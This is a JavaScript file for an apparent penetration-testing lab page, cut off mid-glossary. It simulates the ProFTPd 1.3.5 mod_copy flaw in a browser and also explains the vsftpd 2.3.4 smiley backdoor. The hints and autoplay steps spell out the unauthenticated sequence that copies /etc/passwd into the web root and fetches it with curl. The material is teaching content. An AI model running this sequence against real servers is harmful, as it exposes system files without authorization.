/* ============================================================
 * Lab 00 — viz.js
 *
 * Widgets:
 *   1. #viz-try-it     — two-terminal ProFTPd mod_copy simulator
 *                        (Terminal A: nc 21 → SITE CPFR/CPTO;
 *                         Terminal B: curl → reads the copied file)
 *   2. #viz-topology   — Kali ↔ Metasploitable network mini-diagram
 *   3. (#viz-smiley)   — removed: the §5 'mod_copy bug' explanation
 *                        replaced the smiley flowchart with prose +
 *                        Python sketch
 *   4. #viz-msf        — msfconsole transcript with hover-explain
 *
 * Nothing in this file touches the network or the filesystem. Both
 * terminals are pure state machines; their job is to teach the
 * keystrokes you'll run for real in the cyber range.
 * ============================================================ */

(function () {
  'use strict';

  const TARGET_IP = '10.0.0.6';
  const FTP_BANNER = '220 ProFTPD 1.3.5 Server (Debian) [::ffff:' + TARGET_IP + ']';
  const WEB_ROOT  = '/var/www/html';

  // The /etc/passwd content the SITE CPFR/CPTO chain leaks. Real
  // Metasploitable 3 (Ubuntu 14.04) /etc/passwd is several dozen lines;
  // the lab only needs a representative excerpt.
  const ETC_PASSWD = [
    'root:x:0:0:root:/root:/bin/bash',
    'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin',
    'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
    'sys:x:3:3:sys:/dev:/usr/sbin/nologin',
    'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
    'proftpd:x:107:65534::/var/run/proftpd:/usr/sbin/nologin',
    'vagrant:x:1000:1000::/home/vagrant:/bin/bash',
  ];

  // ------------------------------------------------------------
  // SVG helper
  // ------------------------------------------------------------
  const SVG_NS = 'http://www.w3.org/2000/svg';
  function el(name, attrs, parent, text) {
    const node = document.createElementNS(SVG_NS, name);
    if (attrs) {
      for (const k in attrs) node.setAttribute(k, attrs[k]);
    }
    if (text != null) node.textContent = text;
    if (parent) parent.appendChild(node);
    return node;
  }

  // ============================================================
  // Widget 1 · Two-terminal exploit simulator
  // ============================================================
  (function initTryIt() {
    const root = document.getElementById('viz-try-it');
    if (!root) return;

    // Per-terminal state.
    //   mode: 'kali' | 'ftp'
    //     'kali'  — local shell on attacker host (default for both)
    //     'ftp'   — bytes are being sent over an open `nc` to port 21
    //   cpfrSource: path remembered by SITE CPFR, waiting for SITE CPTO
    const TERMS = {
      A: { mode: 'kali', cpfrSource: null },
      B: { mode: 'kali', cpfrSource: null },
    };
    // Shared state across both terminals. webFiles records absolute
    // paths under WEB_ROOT that the FTP daemon has written — those
    // become reachable via curl from either terminal.
    const WORLD = {
      webFiles: Object.create(null),   // absolute path → file content (string)
    };

    function $(id) { return document.getElementById(id); }
    function screen(t) { return $('term-' + t.toLowerCase() + '-screen'); }
    function prompt(t) { return $('term-' + t.toLowerCase() + '-prompt'); }
    function input(t)  { return $('term-' + t.toLowerCase() + '-input');  }

    function setPrompt(t) {
      const p = prompt(t);
      const s = TERMS[t];
      p.classList.remove('ftp', 'shell', 'empty');
      if (s.mode === 'kali')      p.textContent = 'kali@kali:~$ ';
      else if (s.mode === 'ftp')  { p.textContent = '→ftp> '; p.classList.add('ftp'); }
    }

    function write(t, line, cls) {
      const sc = screen(t);
      const div = document.createElement('div');
      if (cls) div.className = cls;
      div.textContent = (line == null ? '' : line);
      sc.appendChild(div);
      sc.scrollTop = sc.scrollHeight;
    }

    function echoCmd(t, cmd) {
      const s = TERMS[t];
      let preface;
      if (s.mode === 'kali')      preface = 'kali@kali:~$ ';
      else if (s.mode === 'ftp')  preface = '';
      else                        preface = '';
      write(t, preface + cmd, 'term-cmd-echo');
    }

    function clearScreen(t) { screen(t).innerHTML = ''; }

    // ----- File-content readers (what SITE CPFR will see) ------------
    // The daemon runs as root in default Metasploitable 3 setup, so it
    // can read these. The copy operation produces a world-readable
    // file at the destination, which is what makes curl-read possible.
    const FS_READS = {
      '/etc/passwd': ETC_PASSWD.join('\n'),
      '/etc/issue':  'Ubuntu 14.04.5 LTS \\n \\l\n',
      '/etc/hostname': 'metasploitable3-ub1404\n',
    };

    // Recognize `nc <ip> <port>`. Allow TARGET_IP or generic placeholders.
    const NC_RE = /^nc\s+(\S+)\s+(\d+)\s*$/;
    function parseNc(cmd) {
      const m = cmd.match(NC_RE);
      if (!m) return null;
      const host = m[1], port = parseInt(m[2], 10);
      const validHosts = [TARGET_IP, '$TARGET', 'target', 'metasploitable'];
      return { host, port, validHost: validHosts.includes(host) };
    }

    // Recognize `curl http://<host>[:port]/<path>` (allow -s -L flags).
    const CURL_RE = /^curl\s+(?:-[a-zA-Z]+\s+)*(?:'|")?(https?):\/\/([^/:'"]+)(?::(\d+))?(\/[^'"\s]*)(?:'|")?\s*$/;
    function parseCurl(cmd) {
      const m = cmd.match(CURL_RE);
      if (!m) return null;
      return {
        scheme: m[1],
        host:   m[2],
        port:   m[3] ? parseInt(m[3], 10) : (m[1] === 'http' ? 80 : 443),
        path:   m[4],
        validHost: [TARGET_IP, '$TARGET', 'target', 'metasploitable'].includes(m[2]),
      };
    }

    function handleKali(t, cmd) {
      const trimmed = cmd.trim();
      if (!trimmed) return;
      if (trimmed === 'clear') { clearScreen(t); return; }
      if (trimmed === 'help' || trimmed === '?') {
        write(t, 'Try these:', 'term-note');
        write(t, '  nc ' + TARGET_IP + ' 21                     → open FTP (Terminal A)', 'term-note');
        write(t, '  curl http://' + TARGET_IP + '/leak           → fetch a copied file (Terminal B)', 'term-note');
        write(t, '  clear                                → clear this screen', 'term-note');
        return;
      }
      if (/^sudo\s+nmap/.test(trimmed) || /^nmap/.test(trimmed)) {
        write(t, '(simulated — run nmap inside the real cyber range. See §3.)', 'term-note');
        return;
      }
      // curl http://target/<path>
      const curl = parseCurl(trimmed);
      if (curl) {
        if (!curl.validHost) {
          write(t, 'curl: (6) Could not resolve host: ' + curl.host, 'term-err');
          return;
        }
        if (curl.port !== 80) {
          write(t, 'curl: (7) Failed to connect to ' + curl.host + ' port ' + curl.port + ': Connection refused', 'term-err');
          return;
        }
        // Map URL path onto WEB_ROOT
        const fsPath = WEB_ROOT + curl.path;
        if (Object.prototype.hasOwnProperty.call(WORLD.webFiles, fsPath)) {
          const body = WORLD.webFiles[fsPath];
          body.split('\n').forEach(line => write(t, line));
          updateHint('leak_read');
        } else {
          // 404 — emit Apache's body, mimicking what curl actually prints
          write(t, '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">', 'term-err');
          write(t, '<html><head>', 'term-err');
          write(t, '<title>404 Not Found</title>', 'term-err');
          write(t, '</head><body>', 'term-err');
          write(t, '<h1>Not Found</h1>', 'term-err');
          write(t, '<p>The requested URL ' + curl.path + ' was not found on this server.</p>', 'term-err');
          write(t, '</body></html>', 'term-err');
          updateHint('not_copied');
        }
        return;
      }
      // nc <ip> <port>
      const nc = parseNc(trimmed);
      if (nc) {
        if (!nc.validHost) {
          write(t, '(UNKNOWN) [' + nc.host + '] ' + nc.port + ' (?) : No route to host', 'term-err');
          return;
        }
        if (nc.port === 21) {
          TERMS[t].mode = 'ftp';
          TERMS[t].cpfrSource = null;
          setPrompt(t);
          write(t, FTP_BANNER, 'term-srv');
          updateHint('ftp_open');
          return;
        }
        if (nc.port === 80) {
          write(t, '(this lab uses `curl`, not raw `nc`, against the web server. Try: curl http://' + TARGET_IP + '/leak)', 'term-note');
          return;
        }
        write(t, '(UNKNOWN) [' + nc.host + '] ' + nc.port + ' (?) : Connection refused', 'term-err');
        return;
      }
      // Common harmless local commands
      if (trimmed === 'whoami') { write(t, 'kali'); return; }
      if (trimmed === 'id')     { write(t, 'uid=1000(kali) gid=1000(kali) groups=1000(kali)'); return; }
      if (trimmed === 'hostname'){ write(t, 'kali'); return; }
      if (trimmed === 'pwd')    { write(t, '/home/kali'); return; }
      if (trimmed === 'ls')     { write(t, 'Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos'); return; }
      if (/^echo\b/.test(trimmed)) { write(t, trimmed.replace(/^echo\s*/, '')); return; }
      const head = trimmed.split(/\s+/)[0];
      write(t, 'bash: ' + head + ': command not found', 'term-err');
    }

    function handleFtp(t, cmd) {
      const trimmed = cmd.trim();
      if (!trimmed) return;
      // QUIT or Ctrl-C-like
      if (/^quit$/i.test(trimmed) || trimmed === '^C' || trimmed === '^c') {
        write(t, '221 Goodbye.', 'term-srv');
        TERMS[t].mode = 'kali';
        TERMS[t].cpfrSource = null;
        setPrompt(t);
        return;
      }
      // SITE CPFR <path>
      const cpfr = trimmed.match(/^SITE\s+CPFR\s+(\S.*)$/i);
      if (cpfr) {
        TERMS[t].cpfrSource = cpfr[1];
        write(t, '350 File or directory exists, ready for destination name', 'term-srv');
        updateHint('cpfr_set');
        return;
      }
      // SITE CPTO <path>
      const cpto = trimmed.match(/^SITE\s+CPTO\s+(\S.*)$/i);
      if (cpto) {
        const src = TERMS[t].cpfrSource;
        const dest = cpto[1];
        if (!src) {
          // mod_copy returns 503 if CPTO arrives without a preceding CPFR
          write(t, '503 Bad sequence of commands', 'term-err');
          return;
        }
        // Resolve source content with the daemon's permissions (root)
        const body = Object.prototype.hasOwnProperty.call(FS_READS, src)
          ? FS_READS[src]
          : '(simulated content of ' + src + ' — the daemon can read this; the real cyber range has the live bytes.)';
        // If the destination is inside WEB_ROOT, register it as servable.
        if (dest.indexOf(WEB_ROOT + '/') === 0 || dest === WEB_ROOT) {
          WORLD.webFiles[dest] = body;
          write(t, '250 Copy successful', 'term-srv');
          write(t, '(daemon-side: file copied with root privileges; the new file at ' + dest + ' is world-readable, so Apache (as www-data) can serve it.)', 'term-note');
          updateHint('cpto_done');
        } else {
          // Still report success (mod_copy doesn't care about the path) but explain
          write(t, '250 Copy successful', 'term-srv');
          write(t, '(daemon-side: file copied, but ' + dest + ' is not under the web root — curl from Terminal B will not reach it. Try /var/www/html/<name>.)', 'term-note');
        }
        TERMS[t].cpfrSource = null;
        return;
      }
      // USER / PASS — for the lab we never log in, but acknowledge politely
      if (/^USER\s+/i.test(trimmed)) {
        write(t, '331 Password required for ' + trimmed.replace(/^USER\s+/i, ''), 'term-srv');
        write(t, '(note: the mod_copy bug doesn\'t care whether you log in. Skip USER/PASS and go straight to SITE CPFR.)', 'term-note');
        return;
      }
      if (/^PASS\b/i.test(trimmed)) {
        write(t, '530 Login incorrect.', 'term-err');
        return;
      }
      // Other FTP commands we don't model
      const head = trimmed.split(/\s+/)[0].toUpperCase();
      const known = ['LIST','PWD','CWD','RETR','STOR','TYPE','PORT','PASV','SYST','HELP','NOOP'];
      if (known.includes(head)) {
        write(t, '530 Please login with USER and PASS.', 'term-err');
      } else {
        write(t, '500 Unknown command.', 'term-err');
      }
    }

    function dispatch(t, cmd) {
      echoCmd(t, cmd);
      const mode = TERMS[t].mode;
      if (mode === 'kali')      return handleKali(t, cmd);
      if (mode === 'ftp')       return handleFtp(t, cmd);
    }

    // Hint footer copy that updates as state advances
    function updateHint(stage) {
      const hint = $('term-hint');
      if (!hint) return;
      const msgs = {
        ftp_open:    'FTP open. Send <code>SITE CPFR /etc/passwd</code> in Terminal A — no login required.',
        cpfr_set:    '<code>350</code> — source path remembered. Now send <code>SITE CPTO /var/www/html/leak</code>.',
        cpto_done:   '<code>250 Copy successful</code>. Switch to Terminal B → <code>curl http://' + TARGET_IP + '/leak</code>.',
        leak_read:   'You read <code>/etc/passwd</code> without authenticating. That is the full attack primitive.',
        not_copied: 'Apache returned <code>404</code>. The file you tried to fetch wasn\'t copied into <code>' + WEB_ROOT + '</code> yet.',
      };
      if (msgs[stage]) hint.innerHTML = 'Hint · ' + msgs[stage];
    }

    // Wire form submit on each terminal
    document.querySelectorAll('.term-input-row').forEach(form => {
      const t = form.getAttribute('data-term');
      form.addEventListener('submit', (ev) => {
        ev.preventDefault();
        const inp = input(t);
        const cmd = inp.value;
        inp.value = '';
        dispatch(t, cmd);
      });
      form.parentElement.addEventListener('click', () => input(t).focus());
    });

    // Auto-play timer handle, shared with reset() so reset cancels it.
    let autoplayTimer = null;

    function reset() {
      if (autoplayTimer) { clearTimeout(autoplayTimer); autoplayTimer = null; }
      const btn = $('term-autoplay');
      if (btn) btn.disabled = false;
      WORLD.webFiles = Object.create(null);
      ['A', 'B'].forEach(t => {
        TERMS[t].mode = 'kali';
        TERMS[t].cpfrSource = null;
        clearScreen(t);
        setPrompt(t);
        input(t).value = '';
      });
      write('A', '(terminal A — ready. type `nc ' + TARGET_IP + ' 21` to open the FTP control channel.)', 'term-note');
      write('B', '(terminal B — ready. wait until Terminal A reports `250 Copy successful`, then `curl` the copied file.)', 'term-note');
      $('term-hint').innerHTML = 'Hint · type <code>nc ' + TARGET_IP + ' 21</code> in Terminal A.';
    }

    // Auto-play the canonical attack
    function autoplay() {
      if (autoplayTimer) { clearTimeout(autoplayTimer); autoplayTimer = null; }
      reset();
      const btn = $('term-autoplay');
      btn.disabled = true;
      const steps = [
        { wait: 600,  t: 'A', cmd: 'nc ' + TARGET_IP + ' 21' },
        { wait: 1200, t: 'A', cmd: 'SITE CPFR /etc/passwd' },
        { wait: 1200, t: 'A', cmd: 'SITE CPTO /var/www/html/leak' },
        { wait: 1500, t: 'B', cmd: 'curl http://' + TARGET_IP + '/leak' },
      ];
      let i = 0;
      function next() {
        if (i >= steps.length) {
          btn.disabled = false;
          return;
        }
        const step = steps[i++];
        autoplayTimer = setTimeout(() => {
          const inp = input(step.t);
          inp.value = step.cmd;
          setTimeout(() => {
            const cmd = inp.value;
            inp.value = '';
            dispatch(step.t, cmd);
            next();
          }, 200);
        }, step.wait);
      }
      next();
    }

    $('term-autoplay').addEventListener('click', autoplay);
    $('term-reset').addEventListener('click', reset);

    // Initial state
    reset();
  })();

  // ============================================================
  // Widget 2 · Network topology mini-diagram
  // ============================================================
  (function initTopo() {
    const svg = document.getElementById('topo-svg');
    if (!svg) return;
    while (svg.firstChild) svg.removeChild(svg.firstChild);

    // arrowhead marker
    const defs = el('defs', null, svg);
    const m = el('marker', {
      id: 'topo-arrow', viewBox: '0 0 10 10', refX: '9', refY: '5',
      markerWidth: '7', markerHeight: '7', orient: 'auto-start-reverse',
    }, defs);
    el('path', { d: 'M0,0 L10,5 L0,10 z', fill: 'var(--accent)' }, m);
    const m2 = el('marker', {
      id: 'topo-arrow-shell', viewBox: '0 0 10 10', refX: '9', refY: '5',
      markerWidth: '7', markerHeight: '7', orient: 'auto-start-reverse',
    }, defs);
    el('path', { d: 'M0,0 L10,5 L0,10 z', fill: '#6fab5c' }, m2);

    // Hosts
    el('rect', { class: 'host-box kali', x: 40, y: 60, width: 160, height: 100, rx: 8 }, svg);
    el('text', { class: 'host-label', x: 120, y: 95 }, svg, 'Kali (you)');
    el('text', { class: 'host-sub',   x: 120, y: 115 }, svg, '10.0.0.5');
    el('text', { class: 'host-sub',   x: 120, y: 135 }, svg, 'attacker');

    el('rect', { class: 'host-box target', x: 400, y: 60, width: 160, height: 100, rx: 8 }, svg);
    el('text', { class: 'host-label', x: 480, y: 95 }, svg, 'Metasploitable 3');
    el('text', { class: 'host-sub',   x: 480, y: 115 }, svg, '10.0.0.6');
    el('text', { class: 'host-sub',   x: 480, y: 135 }, svg, 'target');

    // Port chips on the LEFT edge of the target (facing Kali). Arrows land
    // here so they never cross the Metasploitable box's labels.
    el('rect', { class: 'port-chip armed', x: 365, y: 78,  width: 32, height: 20, rx: 6 }, svg);
    el('text', { class: 'port-text',       x: 381, y: 90 }, svg, '21');
    el('rect', { class: 'port-chip shell', x: 365, y: 122, width: 32, height: 20, rx: 6 }, svg);
    el('text', { class: 'port-text',       x: 381, y: 134 }, svg, '80');

    // Arrow 1 — Kali → ProFTPd port 21 (SITE CPFR/CPTO; pre-auth).
    el('line', { class: 'arrow-line',       x1: 205, y1: 88,  x2: 362, y2: 88  }, svg);
    el('text', { class: 'arrow-label',      x: 283,  y: 80 }, svg, 'SITE CPFR → SITE CPTO');

    // Arrow 2 — Kali → Apache port 80 (curl the copied file)
    el('line', { class: 'arrow-line shell', x1: 205, y1: 132, x2: 362, y2: 132 }, svg);
    // Reroute the second arrow's head color via marker swap
    svg.querySelectorAll('.arrow-line.shell').forEach(l => l.setAttribute('marker-end', 'url(#topo-arrow-shell)'));
    el('text', { class: 'arrow-label',      x: 283,  y: 152 }, svg, 'curl /leak · file contents');

    // Caption-ish labels above each arrow group
    el('text', { class: 'arrow-label', x: 283, y: 48 }, svg, '① copy file into web root (no auth)');
    el('text', { class: 'arrow-label', x: 283, y: 180 }, svg, '② fetch the copied file over HTTP');

    // Bottom subnet label
    el('text', { class: 'host-sub', x: 300, y: 210 }, svg, 'private subnet · 10.0.0.0/24 · no internet egress');
  })();

  // ============================================================
  // Widget 3 · Smiley trigger flowchart
  // ============================================================
  (function initSmiley() {
    const svg = document.getElementById('smiley-svg');
    if (!svg) return;
    const readout = document.getElementById('smiley-readout');

    while (svg.firstChild) svg.removeChild(svg.firstChild);

    // Layout
    //   USER cmd box (top)
    //   ↓
    //   diamond: contains :) ?
    //   ↙ no                    ↘ yes
    //   normal auth (331)        vsf_sysutil_extra() → fork sh → bind :6200
    const W = 360, H = 360;

    function rect(x, y, w, h, cls, parent) {
      return el('rect', { class: 'flow-node-bg' + (cls ? ' ' + cls : ''), x, y, width: w, height: h, rx: 6 }, parent);
    }
    function diamond(cx, cy, w, h, cls, parent) {
      const pts = [
        cx + ',' + (cy - h/2),
        (cx + w/2) + ',' + cy,
        cx + ',' + (cy + h/2),
        (cx - w/2) + ',' + cy,
      ].join(' ');
      return el('polygon', { class: 'flow-node-bg ' + cls, points: pts }, parent);
    }
    function text(x, y, t, cls, parent) {
      return el('text', { class: 'flow-text' + (cls ? ' ' + cls : ''), x, y }, parent, t);
    }

    // USER box (top centre)
    rect(110, 12, 140, 36, '', svg);
    text(180, 30, 'USER  <arg>',  '', svg);
    text(180, 44, 'received from client', 'small', svg);

    // Diamond (middle)
    diamond(180, 110, 200, 80, 'diamond', svg);
    text(180, 100, 'does <arg> contain', '', svg);
    text(180, 116, '“:)” ?', '', svg);

    // No (left) → normal auth
    rect(8, 200, 150, 70, 'normal', svg);
    text(83, 222, 'normal auth path', '', svg);
    text(83, 240, '331 Please specify', 'small', svg);
    text(83, 254, 'the password.', 'small', svg);

    // Yes (right) → evil
    rect(202, 200, 150, 70, 'evil', svg);
    text(277, 218, 'vsf_sysutil_extra()', '', svg);
    text(277, 236, 'fork /bin/sh', 'small', svg);
    text(277, 252, 'bind tcp/6200', 'small', svg);

    // Edges
    //   USER  → diamond (always active)
    el('line', { class: 'flow-edge active', x1: 180, y1: 48, x2: 180, y2: 70 }, svg);

    //   diamond → No (left)
    const eNo = el('path', {
      class: 'flow-edge',
      d: 'M 100 130 L 60 170 L 60 200',
    }, svg);
    el('text', { class: 'flow-edge-label', x: 70, y: 168 }, svg, 'no');

    //   diamond → Yes (right)
    const eYes = el('path', {
      class: 'flow-edge',
      d: 'M 260 130 L 300 170 L 300 200',
    }, svg);
    el('text', { class: 'flow-edge-label', x: 290, y: 168 }, svg, 'yes');

    //   tail labels (downward arrows from terminal nodes)
    el('line', { class: 'flow-edge', x1: 83,  y1: 270, x2: 83,  y2: 310 }, svg);
    el('text', { class: 'flow-edge-label', x: 83, y: 326 }, svg, 'attacker logs in normally');
    el('line', { class: 'flow-edge', x1: 277, y1: 270, x2: 277, y2: 310 }, svg);
    el('text', { class: 'flow-edge-label', x: 277, y: 326 }, svg, 'root shell on :6200');

    function setBranch(matched) {
      eNo.classList.toggle('active', !matched);
      eYes.classList.toggle('active', matched);
      svg.querySelectorAll('.flow-node-bg.normal').forEach(n => n.classList.toggle('dim', matched));
      svg.querySelectorAll('.flow-node-bg.evil').forEach(n => n.classList.toggle('dim', !matched));
      // Tail edges and labels
      const lines = svg.querySelectorAll('.flow-edge');
      lines.forEach(ln => {
        const d  = ln.getAttribute('d')  || '';
        const x1 = parseFloat(ln.getAttribute('x1') || '0');
        // The two vertical tail lines: one at x=83 (no path), one at x=277 (yes path)
        if (ln.tagName === 'line') {
          if (Math.abs(x1 - 83)  < 1) ln.classList.toggle('active', !matched);
          if (Math.abs(x1 - 277) < 1) ln.classList.toggle('active',  matched);
        }
      });
    }

    // Initial: neutral, both edges dim
    setBranch(false);
    eNo.classList.remove('active');

    // Wire up the picker buttons
    const btns = document.querySelectorAll('.smiley-btn');
    btns.forEach(b => {
      b.addEventListener('click', () => {
        btns.forEach(o => o.classList.remove('active'));
        b.classList.add('active');
        const user = b.getAttribute('data-user') || '';
        const matched = user.indexOf(':)') !== -1;
        setBranch(matched);
        if (matched) {
          readout.innerHTML = '<strong>USER ' + user + '</strong> — contains <code>:)</code> at position ' +
            user.indexOf(':)') + '. The substring check matches, <code>vsf_sysutil_extra()</code> ' +
            'is called, <code>/bin/sh</code> is forked, and tcp/6200 starts listening. The client never gets a <code>230 Login successful</code>.';
        } else {
          readout.innerHTML = '<strong>USER ' + user + '</strong> — no smiley. The server takes the normal auth branch and asks for a password. ' +
            '(Authentication will then fail because <code>' + user + '</code> isn\'t a real account on the box.)';
        }
      });
    });
  })();

  // ============================================================
  // Widget 4 · msfconsole hover-explain
  // ============================================================
  (function initMsfHover() {
    const root = document.getElementById('viz-msf');
    if (!root) return;
    const explain = document.getElementById('msf-explain');
    const lines = root.querySelectorAll('.msf-line');
    const DEFAULT = 'Hover any highlighted line for an explanation.';
    lines.forEach(line => {
      line.addEventListener('mouseenter', () => {
        lines.forEach(o => o.classList.remove('active'));
        line.classList.add('active');
        const t = line.getAttribute('data-explain') || '';
        if (t) explain.textContent = t;
      });
      line.addEventListener('mouseleave', () => {
        line.classList.remove('active');
        explain.textContent = DEFAULT;
      });
      // Touch / keyboard support
      line.addEventListener('click', () => {
        const t = line.getAttribute('data-explain') || '';
        if (t) explain.textContent = t;
      });
    });
    explain.textContent = DEFAULT;
  })();

  // ============================================================
  // Widget 5 · Inline glossary — terms in the lede are hoverable,
  //   the explainer panel sits between the cite block and the
  //   Try-It widget and pushes content below it down.
  // ============================================================
  (function initGlossary() {
    const panel = document.getElementById('glossary-panel');
    if (!panel) return;
    const content = document.getElementById('glossary-content');
    const closeBtn = document.getElementById('glossary-close');
    const terms = document.querySelectorAll('.gloss[data-gloss]');

    const GLOSSARY = {
      'vsftpd': {
        title: 'vsftpd · historical context',
        body:
          '<p><strong>"Very Secure FTP Daemon"</strong> — a popular open-source FTP server written by Chris Evans, widely deployed on Linux servers throughout the 2000s and 2010s. It had a long reputation for being one of the more security-conscious FTP implementations, which makes the July 2011 backdoor episode especially ironic: the compromise was in the distribution channel (the tarball server was breached and the release tarball replaced), not the code Chris wrote.</p>' +
          '<p>The vsftpd 2.3.4 backdoor is the historical anchor for this lab; the active target as of 2026 is <strong>ProFTPd 1.3.5</strong> on Metasploitable 3. The contrast between the two — malicious code injected into a tarball vs. honest code missing an authentication check — is what §5\'s historical-context callout walks.</p>',
      },
      'tarball': {
        title: 'tarball',
        body:
          '<p>A <strong>tarball</strong> is a <code>.tar.gz</code> archive — the conventional way Unix software is distributed as source code. The maintainer publishes the tarball plus a cryptographic signature; users are <em>supposed</em> to download both, verify the signature against the maintainer\'s public key, then unpack and compile.</p>' +
          '<p>In July 2011 an attacker swapped the vsftpd-2.3.4 tarball on the official download server for a backdoored copy. Users who did not verify the signature compiled the malicious code and ran it.</p>',
      },
      'backdoor': {
        title: 'backdoor',
        body:
          '<p>Hidden code added to a program that grants an attacker access while bypassing the program\'s normal authentication. Backdoors can be inserted by the original author (rare and career-ending), by a compromised contributor, or — as in this case — by whoever controls the distribution channel.</p>' +
          '<p>The vsftpd 2.3.4 backdoor is one of the canonical teaching examples because the trigger is so small (a two-character substring, <code>:)</code>) and the effect is so large (pre-auth root shell).</p>',
      },
      'fork-sh': {
        title: 'forking /bin/sh',
        body:
          '<p>Two ideas in one phrase. <strong><code>fork()</code></strong> is the Unix syscall that duplicates the current process — after it runs, you have two near-identical processes, the original (parent) and a copy (child). <strong><code>/bin/sh</code></strong> is the path to the system\'s default shell — the program that reads <code>ls</code>, <code>cd</code>, <code>cat …</code> and runs them.</p>' +
          '<p>"Fork <code>/bin/sh</code> and bind it to port 6200" means: spawn a child process running the shell, attach its <code>stdin</code> and <code>stdout</code> to a network socket listening on TCP/6200, and let anyone who connects to that socket type commands into it. That is the entire payload of the backdoor.</p>',
      },
      'protocol': {
        title: 'protocol',
        body:
          '<p>A <strong>protocol</strong> is a written agreement between two computers about how to talk to each other over a network. It defines the message format (bytes, line-oriented text, binary frames), the order of operations, the responses each side expects, and the state each side keeps as the conversation progresses. FTP, HTTP, SSH, TLS, SMTP, DNS, NTP — every named acronym in networking is a protocol.</p>' +
          '<p>The whole point is interoperability: a server written by one team can talk to a client written by a different team because both sides obeyed the same spec, usually an <a href="https://www.rfc-editor.org/">RFC</a>. FTP\'s spec is <a href="https://www.rfc-editor.org/rfc/rfc959">RFC 959 (1985)</a> and fits in ~70 readable pages. TLS 1.3\'s spec (<a href="https://www.rfc-editor.org/rfc/rfc8446">RFC 8446</a>) is a few hundred pages of cryptographic message exchanges. Same concept, vastly different complexity.</p>',
      },
      'tcp-port': {
        title: 'TCP port',
        body:
          '<p>A <strong>TCP port</strong> is a numbered endpoint on a host where a service listens for connections — think of suite numbers inside a single office building. A host has 65,536 ports (0–65535). Web servers usually answer on <strong>80</strong> (or <strong>443</strong> for HTTPS), SSH on <strong>22</strong>, FTP on <strong>21</strong>.</p>' +
          '<p>When the vsftpd backdoor "binds" to <strong>port 6200</strong>, it claims that port and starts accepting incoming connections — completely separately from the legitimate FTP service still running on port 21. The attacker connects to <code>$TARGET:6200</code> and lands in the shell.</p>',
      },
      'ssh': {
        title: 'SSH',
        body:
          '<p><strong>Secure Shell</strong> — the standard encrypted protocol for remote terminal access. When you "SSH into" a server, you get an interactive command-line session whose contents are encrypted end-to-end, so passwords and commands don\'t cross the wire in plaintext (the way FTP credentials do).</p>' +
          '<p>The cyber range skips the SSH step by streaming Kali\'s desktop straight into your browser via Apache Guacamole. You don\'t need an SSH client today — but you will in later labs, so get the term in your vocabulary now.</p>',
      },
      'subnet': {
        title: 'subnet · CIDR notation',
        body:
          '<p>A <strong>subnet</strong> is a contiguous range of IP addresses that share a network — every host in the subnet can reach every other host directly, without going through a router. The cyber range puts your Kali instance and your target VM into the same private subnet.</p>' +
          '<p>The <code>/24</code> after an address (as in <code>10.0.0.0/24</code>) is <strong>CIDR notation</strong>: it says "the first 24 of 32 IP bits are fixed; the last 8 are free." That gives 2<sup>8</sup> = 256 addresses, <code>10.0.0.0</code> through <code>10.0.0.255</code> — the address range Nmap will sweep in step 2b.</p>',
      },
      'icmp': {
        title: 'ICMP',
        body:
          '<p><strong>Internet Control Message Protocol</strong> — the language behind the <code>ping</code> command. An ICMP <em>echo request</em> packet says "are you alive?", and an <em>echo reply</em> says "yes." ICMP is separate from TCP and UDP; it carries control messages, not application data.</p>' +
          '<p>Nmap\'s <code>-sn</code> ping scan sends one ICMP echo request to every address in the subnet and lists the addresses that reply. Firewalls sometimes drop ICMP, so a missing reply doesn\'t always mean a host is down — but inside the cyber range, everything answers.</p>',
      },
      'root': {
        title: 'root',
        body:
          '<p>On Unix systems, <strong>root</strong> is the privileged superuser account — user id 0. The account that can read any file (including <code>/etc/shadow</code>), kill any process, modify any system configuration, and bind any TCP port. When a program runs "as root," every permission check on the box is short-circuited in its favor.</p>' +
          '<p>The whole point of the vsftpd backdoor — and of most exploits in this course — is to give the attacker a shell running as root. That is the same as having full administrative control of the target machine.</p>',
      },
      'metasploit': {
        title: 'Metasploit',
        body:
          '<p>The <strong>Metasploit Framework</strong> is an open-source exploitation toolkit maintained by Rapid7. It bundles thousands of pre-written attack modules — one per known vulnerability — along with the plumbing to deliver them, manage resulting sessions, and run post-exploitation actions across many targets at once.</p>' +
          '<p>The workflow is the same for every module: <code>use</code> the module, <code>set</code> its required parameters (always <code>RHOSTS</code>, sometimes <code>RPORT</code>, <code>PAYLOAD</code>, others), then <code>run</code>. You will see the same four-step dance in every lab in this course.</p>',
      },
      'enumeration': {
        title: 'enumeration',
        body:
          '<p><strong>Enumeration</strong> is the recon phase of an engagement: the methodical inventory of what is running on a target, who is using it, and what versions are in play — <em>before</em> any exploit is launched. The mental loop is <em>scan → identify → version → look up</em>: find which ports answer, figure out which service is behind each port, pin down the exact version (<code>ProFTPD 1.3.5</code>, not just "an FTP server"), and consult a vulnerability database to see whether that version has a known weakness.</p>' +
          '<p>Skipping enumeration is the most common rookie mistake. Without it you have no idea which exploit applies, and you waste your time firing payloads at services that aren\'t even running. Every attack in this course — and every real engagement governed by the <a href="http://www.pentest-standard.org/">PTES</a> framework — starts here.</p>',
      },
      'proftpd': {
        title: 'ProFTPd',
        body:
          '<p><strong>ProFTPd</strong> ("Pro FTP daemon") is one of the most widely-deployed open-source FTP servers on Unix, originally written by John Morrissey in 1998. Like vsftpd, it has historically been considered a security-conscious implementation — it pioneered chroot jails for FTP, runs unprivileged after binding port 21, and supports an Apache-style modular configuration where features get added by loading optional <code>mod_*</code> modules.</p>' +
          '<p>The 1.3.5 release shipped with <code>mod_copy</code> built but not auth-gated, leading to <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-3306">CVE-2015-3306</a> — the vulnerability you exploit in this lab. Modern ProFTPd (1.3.6+) requires authentication for the <code>SITE</code> family of commands; many production deployments also compile <code>mod_copy</code> out entirely.</p>',
      },
      'mod-copy': {
        title: 'mod_copy',
        body:
          '<p><strong><code>mod_copy</code></strong> is an optional ProFTPd module that adds two non-standard FTP commands: <code>SITE CPFR &lt;source&gt;</code> ("copy from") and <code>SITE CPTO &lt;dest&gt;</code> ("copy to"). Together they let a logged-in user duplicate files on the server side without first downloading and re-uploading them — useful for large backups or for staging files between directories owned by the same daemon.</p>' +
